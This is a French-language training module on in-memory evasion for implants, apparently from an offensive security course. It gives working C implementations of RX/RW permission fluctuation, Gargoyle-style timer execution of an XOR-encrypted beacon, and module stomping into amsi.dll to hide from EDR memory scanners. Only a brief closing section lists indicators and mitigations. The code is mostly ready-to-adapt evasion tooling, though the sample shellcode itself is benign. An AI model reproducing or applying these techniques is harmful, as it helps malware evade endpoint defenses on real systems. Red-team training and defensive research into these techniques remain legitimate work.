# Module W39 : Memory Evasion - Fluctuation RWX et Gargoyle

## Objectifs

- Comprendre les techniques de fluctuation de permissions mémoire
- Implémenter RX/RW fluctuation pour éviter les scans RWX
- Maîtriser la technique Gargoyle (timer-based execution)
- Combiner avec Module Stomping pour un maximum de furtivité

## 1. Le Problème des Pages RWX

### 1.1 Détection des régions RWX

**EDR Memory Scanner** :
```c
// Pseudo-code d'un scanner EDR
ForEach(memory_region in process) {
    if (region.permissions == RWX) {
        // SUSPECT! Shellcode potentiel
        scan_for_malware(region);
        if (is_malicious()) {
            ALERT();
        }
    }
}
```

**Schéma** :
```
Mémoire d'un processus malveillant
┌─────────────────────────────────┐
│ notepad.exe  (RX)     ✓         │ ◄─ Légitime
│ kernel32.dll (RX)     ✓         │ ◄─ Légitime
│ ntdll.dll    (RX)     ✓         │ ◄─ Légitime
│ Shellcode    (RWX) ✗ ◄──────────┼─ SUSPECT! Scanné en priorité
└─────────────────────────────────┘
```

## 2. RX/RW Fluctuation

### 2.1 Principe

**Fluctuation** : Alterner les permissions entre RX (exécution) et RW (modification).

```
Cycle de vie du shellcode
═════════════════════════

Phase 1: Exécution
┌────────────────┐
│ Permissions: RX│ ◄─ Pas d'écriture, juste exécution
│ [Code actif]   │
└────────────────┘

Phase 2: Modification/Déchiffrement
┌────────────────┐
│ Permissions: RW│ ◄─ Pas d'exécution, juste écriture
│ [Mise à jour]  │
└────────────────┘

JAMAIS RWX simultanément!
```

### 2.2 Implémentation

```c
#include <windows.h>
#include <stdio.h>

typedef struct _BEACON_CONTEXT {
    PVOID base;
    SIZE_T size;
    BOOL isExecutable;  // TRUE = RX, FALSE = RW
} BEACON_CONTEXT;

// Bascule entre RX et RW
BOOL FluctuatePermissions(BEACON_CONTEXT* ctx, BOOL makeExecutable) {
    DWORD newProtect = makeExecutable ? PAGE_EXECUTE_READ : PAGE_READWRITE;
    DWORD oldProtect;

    if (!VirtualProtect(ctx->base, ctx->size, newProtect, &oldProtect)) {
        printf("[-] Erreur VirtualProtect: %d\n", GetLastError());
        return FALSE;
    }

    ctx->isExecutable = makeExecutable;
    printf("[+] Permissions: %s\n", makeExecutable ? "RX" : "RW");
    return TRUE;
}

// Exécute du code avec fluctuation
VOID ExecuteWithFluctuation(BEACON_CONTEXT* ctx) {
    // 1. Passer en RX pour exécution
    FluctuatePermissions(ctx, TRUE);

    // 2. Exécuter le code
    typedef void (*FuncPtr)();
    FuncPtr func = (FuncPtr)ctx->base;
    func();

    // 3. Repasser en RW (non-exécutable)
    FluctuatePermissions(ctx, FALSE);
}

// Modifie le code avec fluctuation
VOID ModifyWithFluctuation(BEACON_CONTEXT* ctx, PVOID newCode, SIZE_T size) {
    // 1. Passer en RW pour modification
    FluctuatePermissions(ctx, FALSE);

    // 2. Modifier le code
    memcpy(ctx->base, newCode, size);
    printf("[+] Code modifié\n");

    // 3. Rester en RW (pas besoin de RX si pas d'exécution immédiate)
}

int main() {
    // Shellcode exemple
    unsigned char shellcode[] = {
        0x48, 0x31, 0xC0,  // xor rax, rax
        0xC3               // ret
    };

    // Allouer en RW (pas RWX!)
    PVOID mem = VirtualAlloc(NULL, sizeof(shellcode),
                             MEM_COMMIT | MEM_RESERVE,
                             PAGE_READWRITE);

    memcpy(mem, shellcode, sizeof(shellcode));

    BEACON_CONTEXT ctx = {
        .base = mem,
        .size = sizeof(shellcode),
        .isExecutable = FALSE
    };

    // Cycle beacon avec fluctuation
    for (int i = 0; i < 3; i++) {
        printf("\n=== Cycle %d ===\n", i + 1);

        // Exécution
        ExecuteWithFluctuation(&ctx);

        // Modification (rechiffrement, etc.)
        ModifyWithFluctuation(&ctx, shellcode, sizeof(shellcode));

        Sleep(1000);
    }

    VirtualFree(mem, 0, MEM_RELEASE);
    return 0;
}
```

## 3. Gargoyle - Timer-Based Execution

### 3.1 Principe

**Gargoyle** combine :
1. Chiffrement du beacon
2. Permissions RW (pas X)
3. Timers pour déchiffrer + exécuter + rechiffrer

**Schéma** :
```
Timeline Gargoyle
═════════════════

T+0s   : Beacon chiffré (RW)
T+60s  : Timer expire
         ├─► Déchiffre beacon
         ├─► Change permissions → RX
         ├─► Execute beacon
         ├─► Rechiffre beacon
         ├─► Change permissions → RW
         └─► Reprogramme timer
T+120s : Timer expire (repeat)
```

### 3.2 Implémentation Gargoyle

```c
#include <windows.h>
#include <stdio.h>

typedef struct _GARGOYLE_CONTEXT {
    PVOID beaconBase;
    SIZE_T beaconSize;
    BYTE xorKey;
    HANDLE hTimer;
    LARGE_INTEGER dueTime;
} GARGOYLE_CONTEXT;

// Callback timer Gargoyle
VOID CALLBACK GargoyleCallback(
    PVOID lpParameter,
    BOOLEAN TimerOrWaitFired
) {
    GARGOYLE_CONTEXT* ctx = (GARGOYLE_CONTEXT*)lpParameter;
    DWORD oldProtect;

    printf("[*] Gargoyle Timer - Réveil\n");

    // 1. Déchiffrer
    BYTE* beacon = (BYTE*)ctx->beaconBase;
    for (SIZE_T i = 0; i < ctx->beaconSize; i++) {
        beacon[i] ^= ctx->xorKey;
    }

    // 2. RW → RX
    VirtualProtect(ctx->beaconBase, ctx->beaconSize,
                   PAGE_EXECUTE_READ, &oldProtect);

    // 3. Exécuter
    typedef void (*BeaconFunc)();
    BeaconFunc func = (BeaconFunc)ctx->beaconBase;
    func();

    printf("[+] Beacon exécuté\n");

    // 4. Rechiffrer
    for (SIZE_T i = 0; i < ctx->beaconSize; i++) {
        beacon[i] ^= ctx->xorKey;
    }

    // 5. RX → RW
    VirtualProtect(ctx->beaconBase, ctx->beaconSize,
                   PAGE_READWRITE, &oldProtect);

    printf("[+] Beacon rechiffré et dormant (RW)\n");

    // 6. Reprogrammer le timer (60 secondes)
    SetWaitableTimer(ctx->hTimer, &ctx->dueTime, 0, NULL, NULL, FALSE);
}

BOOL InitGargoyle(GARGOYLE_CONTEXT* ctx, PVOID shellcode, SIZE_T size) {
    // Allouer en RW
    ctx->beaconBase = VirtualAlloc(NULL, size,
                                    MEM_COMMIT | MEM_RESERVE,
                                    PAGE_READWRITE);
    if (!ctx->beaconBase) return FALSE;

    memcpy(ctx->beaconBase, shellcode, size);
    ctx->beaconSize = size;
    ctx->xorKey = 0xAA;

    // Chiffrer immédiatement
    BYTE* beacon = (BYTE*)ctx->beaconBase;
    for (SIZE_T i = 0; i < size; i++) {
        beacon[i] ^= ctx->xorKey;
    }

    // Créer timer
    ctx->hTimer = CreateWaitableTimer(NULL, FALSE, NULL);
    if (!ctx->hTimer) {
        VirtualFree(ctx->beaconBase, 0, MEM_RELEASE);
        return FALSE;
    }

    // Timer de 60 secondes (en unités de 100ns)
    ctx->dueTime.QuadPart = -600000000LL;  // 60s * 10^7

    // Enregistrer callback
    HANDLE hTimerQueue = CreateTimerQueue();
    HANDLE hTimerQueueTimer;

    if (!CreateTimerQueueTimer(
        &hTimerQueueTimer,
        hTimerQueue,
        GargoyleCallback,
        ctx,
        60000,  // 60s initial
        60000,  // 60s périodique
        WT_EXECUTEINTIMERTHREAD
    )) {
        CloseHandle(ctx->hTimer);
        VirtualFree(ctx->beaconBase, 0, MEM_RELEASE);
        return FALSE;
    }

    printf("[+] Gargoyle initialisé (beacon chiffré, RW)\n");
    return TRUE;
}
```

## 4. Module Stomping + Fluctuation

**Combinaison ultime** :
```c
// 1. Charger DLL légitime (amsi.dll)
HMODULE hModule = LoadLibrary(L"amsi.dll");

// 2. Trouver .text section
PVOID textSection = FindTextSection(hModule, &size);

// 3. Passer en RW
VirtualProtect(textSection, size, PAGE_READWRITE, &old);

// 4. Écraser avec beacon chiffré
memcpy(textSection, encryptedBeacon, beaconSize);

// 5. GARDER en RW (pas RX!)

// 6. Timer pour déchiffrer → RX → exécuter → rechiffrer → RW
```

**Avantages** :
- Beacon dans module signé Microsoft
- Jamais RWX
- Chiffré 99% du temps
- Exécution timer-based

## 5. Détection et Mitigations

**IOCs** :
- Appels fréquents à VirtualProtect
- Modifications de modules signés
- Timers avec callbacks vers des régions modifiées

**Mitigations** :
- CFG (Control Flow Guard)
- Monitoring VirtualProtect sur modules système
- Scans mémoire même pour RW (chercher patterns chiffrés)

## 6. Checklist

- [ ] Je comprends pourquoi RWX est détectable
- [ ] Je sais implémenter RX/RW fluctuation
- [ ] Je maîtrise Gargoyle
- [ ] Je peux combiner avec Module Stomping

## Exercices

Voir [exercice.md](exercice.md)

---

**Navigation**
- [Module précédent : Sleep Obfuscation](../06-Sleep-Obfuscation/)
- [Module suivant : Sandbox Detection](../08-Sandbox-Detection/)
